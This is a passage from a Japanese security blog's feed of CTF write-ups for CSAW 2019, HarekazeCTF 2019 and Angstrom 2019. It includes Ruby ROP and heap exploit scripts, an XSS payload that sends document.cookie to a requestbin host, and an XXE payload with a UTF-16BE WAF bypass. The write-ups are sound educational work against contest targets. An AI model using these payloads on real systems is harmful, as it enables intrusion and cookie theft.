z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;check&lt;/span&gt;(dist)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt;&amp;#34;&lt;/span&gt;
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline dist&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;return&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
tmp &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&amp;gt; &amp;#34;&lt;/span&gt;
stack_address &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; tmp&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;match(&lt;span style=&#34;color:#b68&#34;&gt;/.\n(.*) \n\n/&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;to_i(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
add(&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;AAAAAAAA&amp;#34;&lt;/span&gt;)
change(&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;50&lt;/span&gt;, p64(&lt;span style=&#34;color:#666&#34;&gt;0x4008b6&lt;/span&gt;))
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; delete(&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;flag{h0pe_y0u_3nj0y_ur_j0urn3y}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;rev&#34;&gt;Rev&lt;/h2&gt;

&lt;h3 id=&#34;beleaf&#34;&gt;Beleaf&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

idxs &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x02&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x00&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x03&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x8&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x9&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x11&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x13&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x4&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x5&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x15&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x1&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x16&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x2e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0xa&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;

flag &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0x77&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x66&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x7b&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x5f&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6e&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x79&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x7d&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x62&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6c&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x72&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x61&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x6f&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x74&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x67&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x20&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;0x75&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;map(&lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#19177c&#34;&gt;:chr&lt;/span&gt;)

idxs&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
  &lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt; flag&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;flag{we_beleaf_in_your_re_future}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;

&lt;h3 id=&#34;baby-csp&#34;&gt;baby csp&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;CSPが有効なXSS問題

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;default-src &#39;self&#39;; script-src &#39;self&#39; *.google.com; connect-src *&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;上記のCSPからJSONPエンドポイントでのXSSを使う

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://inside.pixiv.blog/kobo/5137&#34;&gt;https://inside.pixiv.blog/kobo/5137&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;FLAGは、Cookieにあるので、requestbin を使ってPOSTさせるJavaScriptを埋め込む&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script src=&amp;quot;https://accounts.google.com/o/oauth2/revoke?callback=navigator.sendBeacon(&#39;http://requestbin.net/r/ugix54ug&#39;, document.cookie)&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flag{csp_will_solve_EVERYTHING}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;unagi&#34;&gt;unagi&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;解けなかったのでwriteupを見た&lt;/li&gt;
&lt;li&gt;XMLがアップロードできるので、XXEだとわかるが、WAFがありいくつかのキーワード(ENTITYやSYSTEMなど)が使えない

&lt;ul&gt;
&lt;li&gt;PUBLIC は使えたりした&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;結論としては、UTF-8ではなくUTF-16BEでアップロードすればWAFをBypassできるというものだった

&lt;ul&gt;
&lt;li&gt;試してたが、普通にXXEとしてうまくないファイルだったためこの方針を諦めてしまっていたのが解けない原因っぽい&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cat x.xml | iconv -f UTF-8 -t UTF-16BE &amp;gt; x_utf-16.xml&lt;/code&gt; などで作成してアップロードする
&lt;code&gt;xml
&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE root[
&amp;lt;!ENTITY pass SYSTEM &amp;quot;file:///flag.txt&amp;quot;&amp;gt;
]&amp;gt;
&amp;lt;users&amp;gt;
&amp;lt;user&amp;gt;
&amp;lt;username&amp;gt;alice2&amp;lt;/username&amp;gt;
&amp;lt;password&amp;gt;passwd1&amp;lt;/password&amp;gt;
&amp;lt;name&amp;gt;Alice2&amp;lt;/name&amp;gt;
&amp;lt;email&amp;gt;alice2@fakesite.com&amp;lt;/email&amp;gt;
&amp;lt;group&amp;gt;CSAW2019&amp;lt;/group&amp;gt;
&amp;lt;intro&amp;gt;&amp;amp;pass;&amp;lt;/intro&amp;gt;
&amp;lt;/user&amp;gt;
&amp;lt;/users&amp;gt;
&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;flag{n0w_i&amp;rsquo;m_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>HarekazeCTF 2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/harekazectf2019/</link>
      <pubDate>Sun, 19 May 2019 16:54:53 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/harekazectf2019/</guid>
      <description>

&lt;h2 id=&#34;baby-rop-1&#34;&gt;Baby ROP 1&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;バイナリ中で、&lt;code&gt;system&lt;/code&gt; 関数使ってechoしており、Canary等もないBOFが起こるので、&lt;code&gt;pop rdi; ret&lt;/code&gt; 使って&lt;code&gt;system(/bin/sh)&lt;/code&gt; を呼ぶだけ&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;problem.harekaze.com&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;20001&lt;/span&gt;

pop_rdi_ret &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x00400683&lt;/span&gt;)
&lt;span style=&#34;color:#008000&#34;&gt;system&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x4005e3&lt;/span&gt;)

&lt;span style=&#34;color:#800&#34;&gt;STDIN&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gets
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;24&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; pop_rdi_ret
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x601048&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;system&lt;/span&gt;

z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;baby-rop-2&#34;&gt;Baby ROP 2&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;system&lt;/code&gt; 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;

&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;

context&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#19177c&#34;&gt;:debug&lt;/span&gt;
z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;Sock&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;problem.harekaze.com&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#666&#34;&gt;20005&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
elf &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./babyrop2&amp;#34;&lt;/span&gt;
libc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;ELF&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#libc = ELF.new &amp;#34;./mylibc.so.6&amp;#34;&lt;/span&gt;

pop_rdi_ret &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x00400733&lt;/span&gt;)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;

payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; pop_rdi_ret
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(elf&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;got&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;__libc_start_main&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x4004f0&lt;/span&gt;)
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(elf&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;main&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;)
&lt;span style=&#34;color:#800&#34;&gt;STDIN&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;gets
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

recvlen &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;length
data &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; data
libc_base &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; u64(data&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;recvlen, &lt;span style=&#34;color:#666&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;ljust(&lt;span style=&#34;color:#666&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)) &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;symbols&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;__libc_start_main&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
libc_magic &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; libc_base &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xf02a4&lt;/span&gt;
&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc base 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_base
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;puts &lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;libc magic 0x%x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;% libc_magic
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;payload &lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(libc_magic)
z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload

z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;login&#34;&gt;Login&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;解けなかった、脆弱性わからず&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;harekaze-note&#34;&gt;Harekaze Note&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Angstrom2019 writeup</title>
      <link>https://owlinux1000.github.io/blog/post/angstrom2019/</link>
      <pubDate>Thu, 25 Apr 2019 21:57:22 +0900</pubDate>
      <guid>https://owlinux1000.github.io/blog/post/angstrom2019/</guid>
      <description>

&lt;h2 id=&#34;misc&#34;&gt;Misc&lt;/h2&gt;

&lt;h3 id=&#34;irc&#34;&gt;IRC&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;freenodeに入るとFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{like_discord_but_worse}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;the-mueller-report&#34;&gt;The mueller Report&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;PDFが渡されるので、とりあえず&lt;code&gt;actf&lt;/code&gt;でgrepするとFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{no0o0o0_col1l1l1luuuusiioooon}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;blank-pdf&#34;&gt;Blank PDF&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;PDFが渡されるが開けず、&lt;code&gt;file&lt;/code&gt;コマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{knot_very_interesting}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;paper-trail&#34;&gt;Paper Trail&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{fake_math_papers}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;scratch-it-out&#34;&gt;Scratch It Out&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる&lt;/li&gt;
&lt;li&gt;project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される&lt;/li&gt;
&lt;li&gt;最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる&lt;/li&gt;
&lt;li&gt;地味に面白い&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;actf{Th5_0pT1maL_LANgUaG3}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;web&#34;&gt;Web&lt;/h2&gt;

&lt;h3 id=&#34;control-you&#34;&gt;Control you&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;HTMLソースを見てFLAG&lt;/li&gt;
